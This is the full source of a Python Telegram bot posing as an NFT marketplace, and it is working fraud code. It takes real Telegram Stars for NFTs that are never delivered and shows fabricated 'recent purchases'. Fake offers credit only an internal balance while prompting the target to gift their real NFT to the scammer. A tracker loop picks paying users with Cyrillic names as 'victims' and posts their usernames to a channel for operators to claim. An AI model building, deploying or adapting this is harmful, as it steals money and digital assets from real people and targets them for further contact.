import asyncio
import json
import logging
import os
import random
import re
from pathlib import Path

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (
    Message, CallbackQuery,
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery,
    InlineQuery, InlineQueryResultArticle, InputTextMessageContent,
    LinkPreviewOptions,
    WebAppInfo,
)

BASE_DIR = Path(__file__).resolve().parent
try:
    from dotenv import load_dotenv
    load_dotenv(BASE_DIR / ".env")
except ImportError:
    pass

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_ID = int(os.getenv("CHANNEL_ID", "-1003807026170"))

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN не задан в переменных окружения")

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
log = logging.getLogger("nft-market")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# URL Mini App для @StellarShopRo_bot
MINI_APP_URL = "https://sethomi.github.io/wtffhhjj/"

SELLER_IDS = {
    8457857107, 7067198657, 5598926953, 8711558266,
    8766135050, 9188693391, 7732304621, 8258955823,
}

def is_registered_seller(user_id: int) -> bool:
    return user_id in SELLER_IDS

NOT_REGISTERED_TEXT = "К сожалению, вы не зарегистрированы в нашей программе продавцов NFT."

BALANCE_FILE = BASE_DIR / "user_balances.json"

def _load_balances() -> dict[int, int]:
    if BALANCE_FILE.exists():
        try:
            raw = json.loads(BALANCE_FILE.read_text(encoding="utf-8"))
            return {int(k): int(v) for k, v in raw.items()}
        except Exception:
            log.exception("Не удалось прочитать балансы")
    return {}

def _save_balances() -> None:
    try:
        BALANCE_FILE.write_text(
            json.dumps({str(k): v for k, v in user_balances.items()}, ensure_ascii=False),
            encoding="utf-8",
        )
    except Exception:
        log.exception("Не удалось сохранить балансы")

user_balances: dict[int, int] = _load_balances()

def get_balance(user_id: int) -> int:
    return user_balances.get(user_id, 0)

def add_balance(user_id: int, amount: int) -> None:
    user_balances[user_id] = get_balance(user_id) + amount
    _save_balances()

user_profiles: dict[int, dict] = {}

def touch_user(user) -> dict:
    profile = user_profiles.setdefault(
        user.id,
        {"username": user.username, "first_name": user.first_name, "purchases": 0, "topups": 0},
    )
    if user.username:
        profile["username"] = user.username
    if user.first_name:
        profile["first_name"] = user.first_name
    return profile

def is_russian(name: str | None) -> bool:
    return bool(re.search(r"[\u0400-\u04FF]", name or ""))

lots: dict[int, dict] = {}
lot_counter = 0
posted_victims: set[int] = set()

def find_loser() -> tuple[int, dict] | None:
    candidates = [
        (uid, p) for uid, p in user_profiles.items()
        if p.get("username") and is_russian(p.get("first_name"))
    ]
    if not candidates:
        return None
    fresh = [c for c in candidates if c[0] not in posted_victims]
    if not fresh:
        posted_victims.clear()
        fresh = candidates
    for key, value in (("purchases", 1), ("topups", 1)):
        tier = [c for c in fresh if c[1].get(key, 0) >= value]
        if tier:
            return random.choice(tier)
    return random.choice(fresh)

LOT_NAMES = ["Winter Wreath", "Neon Lotus", "Aurora Fox", "Mystic Owl", "Crystal Breeze", "Golden Mask", "Silver Moon", "Emerald Crown", "Void Harp", "Frost Chime", "Old Compass", "Paper Lantern"]
LOT_SUFFIXES = ["— архивный лот", "— редкий лот", "— лот"]
TRAIT_MODELS = ["Night Bell", "Star Loom", "Echo Frame", "Glass Prism", "Hollow Bell"]
TRAIT_BACKGROUNDS = ["Azure Blue", "Deep Void", "Aurora Field", "Old Paper", "Night Sky"]
TRAIT_SYMBOLS = ["Cupcake", "Comet", "Lotus", "Owl", "Moon Shard"]

def build_lot_text(lot_number: int) -> str:
    return (
        f"💎 {random.choice(LOT_NAMES)} #{lot_number} {random.choice(LOT_SUFFIXES)}\n\n"
        "👤 Владелец: 🔒 скрыт — займи лот, чтобы увидеть\n"
        f"🎭 Модель: {random.choice(TRAIT_MODELS)} ({random.randint(1, 5)}%)\n"
        f"🖼 Фон: {random.choice(TRAIT_BACKGROUNDS)} ({random.randint(1, 5)}%)\n"
        f"🔖 Символ: {random.choice(TRAIT_SYMBOLS)} ({random.randint(1, 5)}%)\n"
        f"⭐️ Рейтинг владельца: {random.randint(1, 5)} ур.\n"
        f"💎 NFT у владельца: {random.randint(1, 12)}\n\n"
        "⚡️ Кто первым займёт лот, тот увидит номер, @юзернейм и ссылку."
    )

async def post_lot(owner_id: int, username: str) -> None:
    global lot_counter
    lot_counter += 1
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⚡️ Занять лот", callback_data=f"take_lot_{lot_counter}")]
    ])
    lot_number = random.randint(100, 9999)
    msg = await bot.send_message(CHANNEL_ID, build_lot_text(lot_number), reply_markup=keyboard)
    posted_victims.add(owner_id)
    lots[lot_counter] = {
        "owner_id": owner_id, "username": username,
        "message_id": msg.message_id, "taken": False, "lot_number": lot_number,
    }
    log.info("Трекер: лот %s опубликован (владелец @%s)", lot_counter, username)

async def tracker_loop() -> None:
    await asyncio.sleep(45)
    while True:
        try:
            loser = find_loser()
            if loser:
                owner_id, profile = loser
                await post_lot(owner_id, profile["username"])
        except Exception:
            log.exception("Трекер: ошибка публикации")
        await asyncio.sleep(random.randint(900, 1800))

NFT_CATALOG = [
    {"id": 1, "name": "Space ID #4821", "price": 350, "link": "https://t.me/nft/Space-ID-4821"},
    {"id": 2, "name": "Pudgy Penguins TON #1337", "price": 940, "link": "https://t.me/nft/Pudgy-Penguins-TON-1337"},
    {"id": 3, "name": "Ape TON Yacht #7", "price": 2450, "link": "https://t.me/nft/Ape-TON-Yacht-7"},
    {"id": 4, "name": "Meebits TON #99", "price": 620, "link": "https://t.me/nft/Meebits-TON-99"},
    {"id": 5, "name": "Kreepos #42", "price": 480, "link": "https://t.me/nft/Kreepos-42"},
    {"id": 6, "name": "TON Genesis #1", "price": 5900, "link": "https://t.me/nft/TON-Genesis-1"},
]

BUYER_POOL = ["@maxim_ton", "@elena_nft", "@dmitry88", "@kate_art", "@artem_p", "@nft_hunter", "@sofia_m", "@igror2025", "@luna_stars", "@victor_w", "@anya_col", "@tomas_b", "@olga_nft", "@sergey_t", "@mari_k"]
TIME_POOL = ["только что", "2 мин. назад", "7 мин. назад", "15 мин. назад", "26 мин. назад", "41 мин. назад", "1 ч. назад"]

def build_recent_purchases(count: int = 4) -> list[dict]:
    return [
        {"buyer": random.choice(BUYER_POOL), "nft": random.choice(NFT_CATALOG), "time": random.choice(TIME_POOL)}
        for _ in range(count)
    ]

def format_recent_purchases() -> str:
    lines = ["🔥 Недавние покупки:"]
    for item in build_recent_purchases():
        lines.append(f"  • {item['buyer']} купил(а) {item['nft']['name']} — {item['nft']['price']} ⭐ ({item['time']})")
    return "\n".join(lines)

def get_main_menu_keyboard(user_id: int = 0) -> ReplyKeyboardMarkup:
    rows = [
        [KeyboardButton(text="🛒 Каталог NFT")],
        [KeyboardButton(text="👤 Профиль"), KeyboardButton(text="⭐ Пополнить звёзды")],
    ]
    if is_registered_seller(user_id):
        rows.append([KeyboardButton(text="📨 Создать оффер")])
    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True, input_field_placeholder="Выберите действие...")

def get_top_up_inline_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="100 ⭐", callback_data="pay_100"), InlineKeyboardButton(text="500 ⭐", callback_data="pay_500")],
        [InlineKeyboardButton(text="1500 ⭐", callback_data="pay_1500")],
    ])

def get_catalog_inline_keyboard() -> InlineKeyboardMarkup:
    rows = [
        [InlineKeyboardButton(text=f"{nft['name']} — {nft['price']} ⭐", callback_data=f"buy_{nft['id']}")]
        for nft in NFT_CATALOG
    ]
    rows.append([InlineKeyboardButton(text="↻ Обновить каталог", callback_data="refresh_catalog")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@dp.message(Command("start"))
async def cmd_start(message: Message) -> None:
    touch_user(message.from_user)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть Stellar Shop", web_app=WebAppInfo(url=MINI_APP_URL))]
    ])
    await message.answer(
        "Добро пожаловать в Stellar Shop — уникальный NFT-маркетплейс. "
        "Начните торговать, продавать и выводить средства уже сегодня.",
        reply_markup=keyboard,
    )

@dp.message(Command("add"))
async def cmd_add_seller(message: Message) -> None:
    if not is_registered_seller(message.from_user.id):
        await message.answer("Команда для зарегистрированных продавцов NFT.", reply_markup=get_main_menu_keyboard(message.from_user.id))
        return
    parts = (message.text or "").split()
    if len(parts) != 2:
        await message.answer("Формат: /add <ID>\nПример: /add 123456789")
        return
    raw_id = parts[1]
    if not raw_id.isdigit():
        await message.answer(f"❌ ID должен состоять из цифр.\nВы ввели: {raw_id}")
        return
    new_id = int(raw_id)
    if new_id == message.from_user.id:
        await message.answer("Вы уже зарегистрированы в программе продавцов.")
        return
    if new_id in SELLER_IDS:
        await message.answer(f"✅ Пользователь {new_id} уже зарегистрирован.")
        return
    SELLER_IDS.add(new_id)
    await message.answer(f"✅ Пользователь {new_id} зарегистрирован в программе продавцов NFT.\nВсего продавцов: {len(SELLER_IDS)}", reply_markup=get_main_menu_keyboard(message.from_user.id))

@dp.message(Command("sellers"))
async def cmd_sellers(message: Message) -> None:
    if not is_registered_seller(message.from_user.id):
        await message.answer("Команда для зарегистрированных продавцов NFT.", reply_markup=get_main_menu_keyboard(message.from_user.id))
        return
    lines = [f"{i + 1}. {sid}" for i, sid in enumerate(sorted(SELLER_IDS))]
    await message.answer(f"👥 Зарегистрированные продавцы ({len(SELLER_IDS)}):\n" + "\n".join(lines))

@dp.message(F.text == "👤 Профиль")
async def show_profile(message: Message) -> None:
    touch_user(message.from_user)
    inline_status = "✅ доступ открыт" if is_registered_seller(message.from_user.id) else "🔒 доступ закрыт"
    await message.answer(
        "👤 Профиль\n\n"
        f"Пользователь: @{message.from_user.username or 'unknown'}\n"
        f"ID: {message.from_user.id}\n"
        f"⭐ Баланс: {get_balance(message.from_user.id)} ⭐\n"
        f"Inline: {inline_status}"
    )

@dp.message(F.text == "🛒 Каталог NFT")
async def show_catalog(message: Message) -> None:
    touch_user(message.from_user)
    listing = "\n".join(f"{i + 1}. {nft['name']} — <b>{nft['price']} ⭐</b>" for i, nft in enumerate(NFT_CATALOG))
    text = (
        "🛒 Каталог NFT\nПопулярные коллекции сети TON. Оплата звёздами с вашего баланса.\n\n"
        f"{listing}\n\n{format_recent_purchases()}\n\nВыберите NFT для покупки:"
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_catalog_inline_keyboard())

@dp.message(F.text == "⭐ Пополнить звёзды")
async def show_top_up(message: Message) -> None:
    touch_user(message.from_user)
    await message.answer(
        "⭐ Пополнение баланса\n"
        f"Ваш текущий баланс: {get_balance(message.from_user.id)} ⭐\n\n"
        "Выберите сумму пополнения:",
        reply_markup=get_top_up_inline_keyboard(),
    )

@dp.message(F.text.in_({"📨 Создать оффер", "📨 Отправить оффер"}))
async def show_offer(message: Message) -> None:
    touch_user(message.from_user)
    if not is_registered_seller(message.from_user.id):
        await message.answer(NOT_REGISTERED_TEXT, reply_markup=get_main_menu_keyboard(message.from_user.id))
        return
    bot_info = await bot.get_me()
    await message.answer(
        "📨 Создание оффера\n"
        "Создание и публикация оффера бесплатны — баланс для этого не нужен.\n"
        "Открой Inline Mode и введи сначала ссылку NFT, затем через пробел цену в звёздах:\n\n"
        f"@{bot_info.username} https://t.me/nft/Название-123 39399\n\n"
        "Сумма выплачивается получателю из резерва сервера при принятии оффера. Баланс отправителя не списывается."
    )

@dp.callback_query(F.data.startswith("buy_"))
async def handle_buy_nft(call: CallbackQuery) -> None:
    nft_id = int(call.data.split("_")[1])
    nft = next((item for item in NFT_CATALOG if item["id"] == nft_id), None)
    if nft is None:
        await call.answer("NFT не найден. Обновите каталог.", show_alert=True)
        return
    user_id = call.from_user.id
    profile = touch_user(call.from_user)
    profile["purchases"] += 1
    balance = get_balance(user_id)
    if balance < nft["price"]:
        await call.answer(
            f"Недостаточно звёзд: нужно {nft['price']} ⭐, у вас {balance} ⭐.\nПополните баланс.",
            show_alert=True,
        )
        return
    add_balance(user_id, -nft["price"])
    purchase_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="ℹ️ Статус перевода в TON", url="https://tonviewer.com/")]
    ])
    try:
        await edit_callback_message_markup(call, purchase_keyboard)
    except Exception:
        log.exception("Не удалось обновить сообщение о покупке")
    await call.answer(
        f"✅ Покупка подтверждена!\n\n"
        f"«{nft['name']}» будет переведён из кошелька продавца в ваш профиль. "
        f"Подтверждение в сети TON занимает до 15 минут.\n\n"
        f"Списано: {nft['price']} ⭐\nБаланс: {get_balance(user_id)} ⭐",
        show_alert=True,
    )

@dp.callback_query(F.data == "refresh_catalog")
async def handle_refresh_catalog(call: CallbackQuery) -> None:
    listing = "\n".join(f"{i + 1}. {nft['name']} — <b>{nft['price']} ⭐</b>" for i, nft in enumerate(NFT_CATALOG))
    text = (
        "🛒 Каталог NFT\nПопулярные коллекции сети TON. Оплата звёздами с вашего баланса.\n\n"
        f"{listing}\n\n{format_recent_purchases()}\n\nВыберите NFT для покупки:"
    )
    if call.message is not None:
        try:
            await call.message.edit_text(text, parse_mode="HTML", reply_markup=get_catalog_inline_keyboard())
        except Exception:
            pass
    await call.answer("Каталог обновлён.", show_alert=False)

@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery) -> None:
    query_text = inline_query.query.strip()
    if not query_text:
        await inline_query.answer([], cache_time=1, is_personal=True)
        return
    if not is_registered_seller(inline_query.from_user.id):
        await inline_query.answer([InlineQueryResultArticle(
            id="not_registered", title="📋 Программа продавцов NFT", description=NOT_REGISTERED_TEXT,
            input_message_content=InputTextMessageContent(message_text=NOT_REGISTERED_TEXT),
        )], cache_time=1, is_personal=True)
        return
    match = re.search(r"(https://t\.me/nft/\S+)\s+([\d.]+)", query_text)
    if not match:
        await inline_query.answer([InlineQueryResultArticle(
            id="error", title="❌ Неверный формат", description="Введи: https://t.me/nft/... Цена",
            input_message_content=InputTextMessageContent(message_text="Ошибка формата оффера."),
        )], cache_time=1, is_personal=True)
        return
    nft_link = match.group(1)
    price_str = match.group(2)
    nft_name = nft_link.split("/")[-1].replace("-", " #")
    sender_username = inline_query.from_user.username
    if not sender_username:
        await inline_query.answer([InlineQueryResultArticle(
            id="no_username", title="❌ У вас нет username",
            description="Установите username в настройках Telegram, чтобы отправлять офферы.",
            input_message_content=InputTextMessageContent(message_text="Установите username."),
        )], cache_time=1, is_personal=True)
        return

    results: list[InlineQueryResultArticle] = []
    try:
        stars_price = int(float(price_str))
        stars_offer_text = (
            f"Пользователь предлагает Вам {stars_price} ⭐ за <a href='{nft_link}'>{nft_name}</a>.\n\n"
            "Предложение действует ещё 5 ч. 59 м.."
        )
        stars_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="Отклонить", callback_data="reject_offer"),
            InlineKeyboardButton(text="Принять", callback_data=f"accept_{stars_price}_{nft_name}_{sender_username}"),
        ]])
        results.append(InlineQueryResultArticle(
            id="offer_stars", title="Оффер NFT (за звёзды)", description=f"Цена: {stars_price} ⭐",
            input_message_content=InputTextMessageContent(
                message_text=stars_offer_text, parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(url=nft_link, show_above_text=True),
            ),
            reply_markup=stars_keyboard,
        ))
    except ValueError:
        pass

    gram_offer_text = (
        f"Пользователь предлагает Вам {price_str} GRAM за <a href='{nft_link}'>{nft_name}</a>.\n\n"
        "Предложение действует ещё 5 ч. 59 м.."
    )
    gram_keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data="greject_offer"),
        InlineKeyboardButton(text="Принять", callback_data=f"gaccept_{price_str}_{nft_name}_{sender_username}"),
    ]])
    results.append(InlineQueryResultArticle(
        id="offer_gram", title="Оффер NFT (за GRAM)", description=f"Цена: {price_str} GRAM",
        input_message_content=InputTextMessageContent(
            message_text=gram_offer_text, parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(url=nft_link, show_above_text=True),
        ),
        reply_markup=gram_keyboard,
    ))
    await inline_query.answer(results, cache_time=1, is_personal=True)

async def edit_callback_message_markup(call: CallbackQuery, reply_markup: InlineKeyboardMarkup | None) -> bool:
    if call.inline_message_id:
        await bot.edit_message_reply_markup(inline_message_id=call.inline_message_id, reply_markup=reply_markup)
        return True
    if call.message is not None:
        await bot.edit_message_reply_markup(
            chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=reply_markup
        )
        return True
    return False

@dp.callback_query(F.data.startswith("accept_"))
async def handle_accept_offer(call: CallbackQuery) -> None:
    parts = (call.data or "").split("_", 3)
    if len(parts) != 4:
        await call.answer("Некорректные данные оффера.", show_alert=True)
        return
    price, nft_name, sender_username = parts[1], parts[2], parts[3]
    try:
        price_int = int(float(price))
    except ValueError:
        await call.answer("Некорректная цена оффера.", show_alert=True)
        return
    add_balance(call.from_user.id, price_int)
    transfer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={sender_username}")]
    ])
    try:
        edited = await edit_callback_message_markup(call, transfer_keyboard)
    except Exception:
        log.exception("Не удалось обновить клавиатуру принятого оффера")
        await call.answer("Не удалось обновить кнопки оффера. Попробуйте ещё раз.", show_alert=True)
        return
    if not edited:
        await call.answer("Не удалось найти сообщение с оффером.", show_alert=True)
        return
    await call.answer(
        f"Предложение на {nft_name} принято.\n\n"
        f"Для завершения сделки владелец должен передать NFT.\nСумма оффера: {price_int} ⭐",
        show_alert=True,
    )

@dp.callback_query(F.data == "reject_offer")
async def handle_reject_offer(call: CallbackQuery) -> None:
    try:
        edited = await edit_callback_message_markup(call, None)
    except Exception:
        log.exception("Не удалось убрать кнопки отклонённого оффера")
        await call.answer("Не удалось обновить сообщение с оффером.", show_alert=True)
        return
    if not edited:
        await call.answer("Не удалось найти сообщение с оффером.", show_alert=True)
        return
    await call.answer("❌ Вы отклонили оффер.\n\nСделка отменена. Звёзды не списаны.", show_alert=True)

@dp.callback_query(F.data.startswith("gaccept_"))
async def handle_gram_accept_offer(call: CallbackQuery) -> None:
    parts = (call.data or "").split("_", 3)
    if len(parts) != 4:
        await call.answer("Некорректные данные оффера.", show_alert=True)
        return
    price, nft_name, sender_username = parts[1], parts[2], parts[3]
    transfer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT", url=f"tg://send_gift?to={sender_username}")]
    ])
    try:
        edited = await edit_callback_message_markup(call, transfer_keyboard)
    except Exception:
        log.exception("Не удалось обновить клавиатуру принятого GRAM оффера")
        await call.answer("Не удалось обновить кнопки оффера. Попробуйте ещё раз.", show_alert=True)
        return
    if not edited:
        await call.answer("Не удалось найти сообщение с оффером.", show_alert=True)
        return
    await call.answer(
        f"Предложение на {nft_name} принято.\n\n"
        f"Для завершения сделки владелец должен передать NFT.\nСумма оффера: {price} GRAM",
        show_alert=True,
    )

@dp.callback_query(F.data == "greject_offer")
async def handle_gram_reject_offer(call: CallbackQuery) -> None:
    try:
        edited = await edit_callback_message_markup(call, None)
    except Exception:
        log.exception("Не удалось убрать кнопки отклонённого GRAM оффера")
        await call.answer("Не удалось обновить сообщение с оффером.", show_alert=True)
        return
    if not edited:
        await call.answer("Не удалось найти сообщение с оффером.", show_alert=True)
        return
    await call.answer("❌ Вы отклонили оффер.\n\nСделка отменена. GRAM не списаны.", show_alert=True)

@dp.callback_query(F.data.startswith("take_lot_"))
async def handle_take_lot(call: CallbackQuery) -> None:
    try:
        lot_id = int(call.data.split("_")[2])
    except (IndexError, ValueError):
        await call.answer("Некорректный лот.", show_alert=True)
        return
    lot = lots.get(lot_id)
    if lot is None:
        await call.answer("Лот не найден.", show_alert=True)
        return
    if lot["taken"]:
        await call.answer("Лот уже занят.", show_alert=True)
        return
    lot["taken"] = True
    reveal_text = (
        "⚡️ Вы первыми заняли лот!\n\n"
        f"🔖 Номер лота: #{lot['lot_number']}\n"
        f"👤 Владелец: @{lot['username']}\n"
        f"💬 Написать: https://t.me/{lot['username']}\n\n"
        "Поторгуйтесь напрямую — лот больше никому не покажется."
    )
    try:
        await bot.send_message(call.from_user.id, reveal_text)
    except Exception:
        lot["taken"] = False
        await call.answer("Не удалось отправить детали. Нажмите /start боту и займите лот снова.", show_alert=True)
        return
    taken_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Занят", callback_data="taken_nop")]
    ])
    try:
        await bot.edit_message_reply_markup(
            chat_id=CHANNEL_ID, message_id=lot["message_id"], reply_markup=taken_keyboard
        )
    except Exception:
        log.exception("Трекер: не удалось обновить пост в канале")
    await call.answer("Лот занят! Детали отправлены в личку.", show_alert=True)

@dp.callback_query(F.data == "taken_nop")
async def handle_taken_nop(call: CallbackQuery) -> None:
    await call.answer("Лот уже занят.", show_alert=True)

async def send_star_invoice(chat_id: int, amount: int, title: str, payload: str) -> None:
    await bot.send_invoice(
        chat_id=chat_id, title=title,
        description=f"Пополнение баланса NFT Market на {amount} звёзд.",
        payload=payload, provider_token="", currency="XTR",
        prices=[LabeledPrice(label=title, amount=amount)],
    )

@dp.callback_query(F.data.startswith("pay_"))
async def handle_top_up_payment(call: CallbackQuery) -> None:
    try:
        amount = int(call.data.split("_")[1])
    except (IndexError, ValueError):
        await call.answer("Некорректная сумма.", show_alert=True)
        return
    await send_star_invoice(call.from_user.id, amount, f"Пополнение на {amount}⭐", call.data)
    await call.answer()

@dp.pre_checkout_query()
async def process_pre_checkout_query(pre_checkout_query: PreCheckoutQuery) -> None:
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@dp.message(F.successful_payment)
async def process_successful_payment(message: Message) -> None:
    payment_info = message.successful_payment
    profile = touch_user(message.from_user)
    profile["topups"] += 1
    add_balance(message.from_user.id, payment_info.total_amount)
    await message.answer(
        f"✅ Баланс пополнен на {payment_info.total_amount} ⭐!\n"
        f"Теперь вы можете покупать NFT в каталоге.\n\n"
        f"Ваш баланс: {get_balance(message.from_user.id)} ⭐",
        reply_markup=get_main_menu_keyboard(message.from_user.id),
    )

async def main() -> None:
    log.info("Запуск бота...")
    tracker_task = asyncio.create_task(tracker_loop())
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        tracker_task.cancel()
        try:
            await tracker_task
        except asyncio.CancelledError:
            pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
